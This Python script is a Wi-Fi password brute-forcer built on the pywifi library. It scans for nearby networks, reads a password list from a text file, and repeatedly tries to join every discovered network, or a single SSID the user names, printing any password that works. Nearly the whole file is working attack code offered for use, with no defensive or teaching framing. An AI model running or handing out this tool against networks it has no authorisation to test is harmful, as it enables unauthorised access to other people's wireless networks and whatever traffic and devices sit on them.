import time
from typing import Dict, List
import pywifi
from pywifi import const


# Attempt the scan
def scan_wifi_networks(timeout: int = 5) -> List[Dict[str, str]]:
    """Scans for nearby Wi-Fi networks and returns a list of network dictionaries.

    :param timeout: Time to wait for the scan to complete in seconds.
    :return: List of dictionaries containing SSID, BSSID, and Signal Strength
    (RSSI).
    """
    try:
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()

        if not interfaces:
            print("[Error] No wireless interfaces found on this system.")
            return []

        iface = interfaces[0]

        print("[*] Starting Wi-Fi scan...")
        iface.scan()
        time.sleep(timeout)  # Allow time for the adapter to collect APs

        results = iface.scan_results()

        # Datastore to hold unique SSIDs (removing duplicates from multi-band routers)
        discovered_networks: List[Dict[str, str]] = []
        seen_ssids = set()

        for ap in results:
            # Filter out hidden or empty SSIDs
            ssid = ap.ssid.strip()
            if ssid and ssid not in seen_ssids:
                seen_ssids.add(ssid)
                discovered_networks.append(
                    {
                        "ssid": ssid,
                        "bssid": ap.bssid,
                        "signal": (
                            ap.signal
                        ),  # Signal strength in dBm (e.g., -50 is stronger than -80)
                    }
                )

        print(f"[+] Scan complete. Found {len(discovered_networks)} networks.")
        return discovered_networks

    except Exception as err:
        print(f"[Error] Failed to scan Wi-Fi networks: {err}")
        return []
    
# use a text file for password list 
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"Password file '{file_path}' not found.")
        return []

# attempt to connect wifi
def connect_to_wifi(
    ssid: str, password: str, connection_timeout: int = 10
) -> bool:
    """Attempts to connect to a specified Wi-Fi network using an SSID and password.

    :param ssid: Name of the Wi-Fi network.
    :param password: Password for the Wi-Fi network.
    :param connection_timeout: Maximum time to wait for connection in
    seconds.
    :return: True if connected successfully, False otherwise.
    """
    try:
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()

        if not interfaces:
            print(
                "[Error] Connection aborted: No Wi-Fi adapter detected on Windows."
            )
            return False

        iface = interfaces[0]

        # 1. Ensure adapter is currently disconnected before creating a new profile
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[*] Disconnecting from current network...")
            iface.disconnect()
            time.sleep(2)

        # 2. Configure the connection profile
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Standard WPA2-PSK
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        # 3. Clean existing profiles to prevent conflict in Windows Native Wifi API
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        # 4. Initiate connection
        print(f"[*] Attempting to connect to '{ssid}'...")
        iface.connect(tmp_profile)

        # 5. Poll connection status until timeout
        start_time = time.time()
        while time.time() - start_time < connection_timeout:
            status = iface.status()

            if status == const.IFACE_CONNECTED:
                print(f"[SUCCESS] Successfully connected to '{ssid}' with password '{password}'!")
                return True

            elif status == const.IFACE_DISCONNECTED:
                # Still trying or failed auth; short sleep before checking again
                pass

            time.sleep(1)

        # 6. Handle timeout / wrong password state
        print(
            f"[FAILED] Could not connect to '{ssid}'. Check password or signal strength."
        )

        # Cleanup failed profile attempt
        iface.disconnect()
        iface.remove_all_network_profiles()
        return False

    except Exception as err:
        print(
            f"[Error] An exception occurred while attempting to connect: {err}"
        )
        return False

# attempt to connect to all networks with all passwords
def attempt_bruteforce_all(networks, passwords):
    for net in networks:
        ssid = net.get("ssid", "Hidden Network")
        print(f"\nAttempting to connect to SSID: {ssid}")
        for password in passwords:
            if connect_to_wifi(ssid, password):
                break  # Stop trying passwords if connection is successful

# attempt bruteforce on 1
def attempt_bruteforce_single(ssid, passwords):
    print(f"\nAttempting to connect to SSID: {ssid}")
    for password in passwords:
        if connect_to_wifi(ssid, password):
            break  # Stop trying passwords if connection is successful


# main execution
if __name__ == "__main__":


    # STEP 1: Scan and store available networks
    scanned_datastore = scan_wifi_networks(timeout=4)

    print("\n--- Discovered Networks Datastore ---")
    for net in scanned_datastore:
        print(f"SSID: {net['ssid']} | Signal: {net['signal']} dBm")
    print("--------------------------------------\n")

    # STEP 2: Load password list from a text file
    password_file_path = "passwords.txt"  # Ensure this file exists with passwords
    password_list = load_passwords(password_file_path)
"""
    if not password_list:
        print("[Error] No passwords loaded. Exiting.")
    else:
        # STEP 3: Attempt to brute-force connect to each discovered network
        attempt_bruteforce_all(scanned_datastore, password_list)
"""
# ask user to bruteforce all or single
user_choice = input("Do you want to attempt brute-force on all networks or a single network? (all/single): "
).strip().lower()
if user_choice == "all":
    if not password_list:
        print("[Error] No passwords loaded. Exiting.")
    else:
        # STEP 3: Attempt to brute-force connect to each discovered network
        attempt_bruteforce_all(scanned_datastore, password_list)
elif user_choice == "single":
    target_ssid = input("Enter the SSID of the network you want to brute-force: ").strip()
    if not password_list:
        print("[Error] No passwords loaded. Exiting.")
    else:
        # STEP 3: Attempt to brute-force connect to the specified network
        attempt_bruteforce_single(target_ssid, password_list)


